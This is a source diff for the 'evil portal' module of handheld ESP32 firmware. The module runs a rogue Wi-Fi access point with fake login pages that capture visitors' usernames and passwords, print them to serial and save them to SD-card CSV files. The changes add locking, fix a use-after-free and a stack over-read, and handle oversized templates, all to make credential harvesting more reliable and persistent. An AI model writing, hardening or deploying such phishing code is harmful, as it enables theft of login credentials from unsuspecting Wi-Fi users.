@@ -54,6 +54,19 @@ static lv_obj_t *s_stop_btn = nullptr;
 static lv_obj_t *s_keyboard = nullptr;
 static bool s_active = false;
 
+// Real-hardware review finding (2026-08-15, Critical + Major): guards every
+// access to s_active_template/s_active_template_len/s_capture_path below.
+// Those are written on the main/LVGL task (launch_click_cb()/stop_portal())
+// and read on AsyncTCP's own task (handle_root()/handle_submit()) -- a real
+// cross-task boundary this file's first version crossed with no protection
+// at all, unlike this project's stated house rule (hal/c2link_ble.cpp:
+// "anything multi-word or multi-field crossing that same boundary needs the
+// portMUX_TYPE/portENTER_CRITICAL/portEXIT_CRITICAL pattern"). One shared
+// mux for both: neither piece of state is ever touched together with the
+// other, so there's no cross-lock ordering to get wrong, and one mux is
+// simpler to reason about than two.
+static portMUX_TYPE s_cross_task_mux = portMUX_INITIALIZER_UNLOCKED;
+
 // Real feature, added 2026-08-15 per direct real-hardware feedback: captured
 // credentials were only ever shown on-screen, never persisted -- closing
 // the screen (or losing power) lost them. Written as CSV rows, same
@@ -72,12 +85,46 @@ static int s_template_count = 0;
 static uint8_t *s_active_template = nullptr;
 static size_t s_active_template_len = 0;
 
+// Real-hardware review finding (2026-08-15, Critical): the previous version
+// handed AsyncWebServerRequest::send()'s raw-pointer overload
+// (s_active_template, s_active_template_len) straight through, which builds
+// an AsyncProgmemResponse -- confirmed (WebResponses.cpp) to store that bare
+// pointer and stream from it via repeated _fillBuffer() calls for the whole
+// response duration, NOT copy it at send() time. Since free_active_template()
+// can run on the main/LVGL task (Stop/Back/relaunch) at any moment, including
+// while AsyncTCP is mid-stream, that was a genuine cross-task use-after-free
+// reachable by ordinary "tap Stop while a client is loading the page" timing.
+//
+// Fixed by taking a locked snapshot into a scratch buffer allocated OUTSIDE
+// the critical section (allocating -- `new`/heap_caps -- while holding a
+// portMUX is unsafe: the heap allocator has its own internal locking, and
+// nesting it inside a critical section that disables interrupts/preemption
+// on this core risks contention/priority-inversion), then handing the
+// request a String built from that snapshot. AsyncBasicResponse (confirmed
+// via WebResponseImpl.h: `String _content;`, a true owning member -- what
+// the String-based send() overload builds, the same one the built-in
+// kPortalHtml path already used) copies the String into its own private,
+// response-owned buffer. Once this function returns, nothing async holds a
+// pointer into s_active_template anymore, no matter when Stop/Back fires.
 static void handle_root(AsyncWebServerRequest *request) {
-    if (s_active_template != nullptr) {
-        request->send(200, "text/html", s_active_template, s_active_template_len);
+    uint8_t *scratch = new uint8_t[kMaxTemplateBytes];
+    size_t len = 0;
+    bool has_template;
+    portENTER_CRITICAL(&s_cross_task_mux);
+    has_template = (s_active_template != nullptr);
+    if (has_template) {
+        len = s_active_template_len;
+        memcpy(scratch, s_active_template, len);
+    }
+    portEXIT_CRITICAL(&s_cross_task_mux);
+
+    if (has_template) {
+        String content((const char *)scratch, len);
+        request->send(200, "text/html", content);
     } else {
         request->send(200, "text/html", kPortalHtml);
     }
+    delete[] scratch;
 }
 
 static void handle_submit(AsyncWebServerRequest *request) {
@@ -87,21 +134,51 @@ static void handle_submit(AsyncWebServerRequest *request) {
     // list, and (2026-08-15, real feature added per direct real-hardware
     // feedback) persisted to SD as a CSV row so it survives closing the
     // screen or losing power. This callback runs on AsyncTCP's own task
-    // (not the main/LVGL task) -- SD_MMC writes from here are the same
-    // shape wifi_pmkid.cpp's promiscuous callback explicitly avoided
-    // (that callback runs on the WiFi driver task and defers actual SD
-    // writes to poll() on the main task via a ring buffer). This path is
-    // different in a way that matters: form submissions are a few per
-    // minute at most (a human filling in a login form), not a
-    // packets-per-second stream, so a synchronous append_capture_file()
-    // call here -- a bounded local SD_MMC write, not a network wait --
-    // does not risk the AsyncTCP task's own responsiveness the way
-    // unthrottled promiscuous-callback writes would have.
+    // (not the main/LVGL task).
+    //
+    // Real-hardware review finding (2026-08-15): the original comment here
+    // justified the synchronous append_capture_file() call by submission
+    // FREQUENCY (a few/minute, unlike wifi_pmkid.cpp's packet-rate
+    // promiscuous callback) -- independently checked, and frequency isn't
+    // actually the load-bearing reason. The real answer: this project's
+    // toolchain has FF_FS_REENTRANT=1 (FatFs's own per-volume mutex,
+    // confirmed in the installed sdkconfig.h/ffconf.h), so concurrent
+    // SD_MMC access from different tasks is already serialized safely
+    // regardless of call frequency -- wifi_pmkid.cpp's avoidance is instead
+    // about running in an IRAM_ATTR'd, ISR-adjacent WiFi-driver callback
+    // context (a different constraint: driver-callback vs. ordinary task),
+    // which AsyncTCP's task, a normal FreeRTOS task, doesn't share.
+    // Frequency does still matter for how long this task might wait on the
+    // FatFs mutex if another task is mid-write -- a latency concern, not a
+    // safety one.
     Serial.printf("quarky-tab5: [evil-portal] captured user='%s' pass='%s'\n", user.c_str(), pass.c_str());
-    if (s_capture_path[0] != '\0') {
+
+    char path[sizeof(s_capture_path)];
+    portENTER_CRITICAL(&s_cross_task_mux);
+    strncpy(path, s_capture_path, sizeof(path) - 1);
+    path[sizeof(path) - 1] = '\0';
+    portEXIT_CRITICAL(&s_cross_task_mux);
+
+    if (path[0] != '\0') {
         char row[192];
-        int n = snprintf(row, sizeof(row), "%lu,%s,%s\n", (unsigned long)millis(), user.c_str(), pass.c_str());
-        if (!storage.append_capture_file(s_capture_path, (const uint8_t *)row, n)) {
+        // Real-hardware review finding (2026-08-15, confirmed bug): snprintf's
+        // return value is how many characters WOULD have been written had the
+        // buffer been large enough (C99/C11), not how many actually were --
+        // using it directly as append_capture_file()'s length argument was a
+        // stack over-read into the SD card on sufficiently long user/pass
+        // input (this feature's own docs already say to expect arbitrary-
+        // length input here). snprintf always NUL-terminates row even on
+        // truncation, so strlen() is the real written length.
+        //
+        // NOTE (review Minor, not fixed): user/pass are written raw, not
+        // CSV-escaped -- a submitted value containing a literal comma shifts
+        // columns for that row, and one containing a literal newline (not
+        // reachable via a normal browser form, but possible via a
+        // hand-crafted POST body) injects a spurious row. Low severity for
+        // an operator's own later analysis file, not a machine-critical
+        // pipeline; left as-is rather than adding CSV-quoting logic here.
+        snprintf(row, sizeof(row), "%lu,%s,%s\n", (unsigned long)millis(), user.c_str(), pass.c_str());
+        if (!storage.append_capture_file(path, (const uint8_t *)row, strlen(row))) {
             Serial.println("quarky-tab5: [evil-portal] append_capture_file FAILED");
         }
     }
@@ -131,14 +208,23 @@ static void stop_portal() {
     s_server = nullptr;
     WiFi.softAPdisconnect(true); // actually stop the AP, not just the app-level servers
     s_active = false;
-    s_capture_path[0] = '\0'; // defensive -- the server is gone so handle_submit()
-                              // can't fire again, but this keeps state consistent
+    // Defensive -- the server is gone so handle_submit() can't fire again --
+    // but still under the lock for consistency with every other touch of
+    // this array (real-hardware review finding, 2026-08-15).
+    portENTER_CRITICAL(&s_cross_task_mux);
+    s_capture_path[0] = '\0';
+    portEXIT_CRITICAL(&s_cross_task_mux);
 }
 
 static void free_active_template() {
+    // Real-hardware review finding (2026-08-15, part of the Critical fix):
+    // the free itself must be under the same lock handle_root()'s snapshot
+    // uses, or the snapshot's memcpy could race a concurrent delete[].
+    portENTER_CRITICAL(&s_cross_task_mux);
     delete[] s_active_template;
     s_active_template = nullptr;
     s_active_template_len = 0;
+    portEXIT_CRITICAL(&s_cross_task_mux);
 }
 
 // Blocking-call analysis (build-time review, this task -- see shell.cpp:
@@ -188,13 +274,28 @@ static void launch_click_cb(lv_event_t *e) {
     // distinct Launch sessions don't interleave. Header row (column names)
     // written once here via write_capture_file()'s overwrite semantics;
     // handle_submit() appends one row per real submission.
-    snprintf(s_capture_path, sizeof(s_capture_path), "/quarky/captures/wifi/evil_portal_%lu.csv",
+    //
+    // Real-hardware review finding (2026-08-15, Major): build the path into
+    // a local buffer first, THEN copy into s_capture_path under the lock --
+    // s_capture_path is read from handle_submit() on AsyncTCP's task, and
+    // writing it in place with no lock (the original version) risked a torn
+    // read if a submission landed mid-relaunch.
+    char new_path[sizeof(s_capture_path)];
+    snprintf(new_path, sizeof(new_path), "/quarky/captures/wifi/evil_portal_%lu.csv",
              (unsigned long)millis());
     const char kHeader[] = "ms,user,pass\n";
-    if (!storage.write_capture_file(s_capture_path, (const uint8_t *)kHeader, sizeof(kHeader) - 1)) {
+    bool header_ok = storage.write_capture_file(new_path, (const uint8_t *)kHeader, sizeof(kHeader) - 1);
+    if (!header_ok) {
         Serial.println("quarky-tab5: [evil-portal] capture file header write FAILED -- credentials will not be persisted this session");
+    }
+    portENTER_CRITICAL(&s_cross_task_mux);
+    if (header_ok) {
+        strncpy(s_capture_path, new_path, sizeof(s_capture_path) - 1);
+        s_capture_path[sizeof(s_capture_path) - 1] = '\0';
+    } else {
         s_capture_path[0] = '\0'; // handle_submit()'s own check skips writing when this is empty
     }
+    portEXIT_CRITICAL(&s_cross_task_mux);
 
     free_active_template();
     uint16_t selected = s_template_dropdown ? lv_dropdown_get_selected(s_template_dropdown) : 0;
@@ -203,12 +304,30 @@ static void launch_click_cb(lv_event_t *e) {
         snprintf(path, sizeof(path), "%s/%s", kPortalDir, s_template_names[selected - 1]);
         uint8_t *buf = new uint8_t[kMaxTemplateBytes];
         size_t len = 0;
-        if (storage.read_file(path, buf, kMaxTemplateBytes, &len) && len > 0) {
+        // Real-hardware review finding (2026-08-15, Moderate, doc/code
+        // mismatch): read_file() caps its read at kMaxTemplateBytes and has
+        // no way to report whether the source file was actually larger --
+        // len == kMaxTemplateBytes is the only signal available, and a real
+        // login-page template landing on exactly that byte boundary by
+        // legitimate coincidence is vanishingly unlikely. Treating it as
+        // "probably truncated, don't serve a broken page" and falling back
+        // to the built-in template now matches what docs/features/
+        // evil-portal.md already documented (reject + fallback), which the
+        // first version of this code didn't actually implement.
+        bool loaded = storage.read_file(path, buf, kMaxTemplateBytes, &len) && len > 0 && len < kMaxTemplateBytes;
+        if (loaded) {
+            portENTER_CRITICAL(&s_cross_task_mux);
             s_active_template = buf;
             s_active_template_len = len;
+            portEXIT_CRITICAL(&s_cross_task_mux);
         } else {
             delete[] buf;
-            Serial.printf("quarky-tab5: [evil-portal] failed to load template '%s', using built-in\n", path);
+            if (len == kMaxTemplateBytes) {
+                Serial.printf("quarky-tab5: [evil-portal] template '%s' too large (>%zu bytes), "
+                              "using built-in\n", path, kMaxTemplateBytes);
+            } else {
+                Serial.printf("quarky-tab5: [evil-portal] failed to load template '%s', using built-in\n", path);
+            }
         }
     }
 
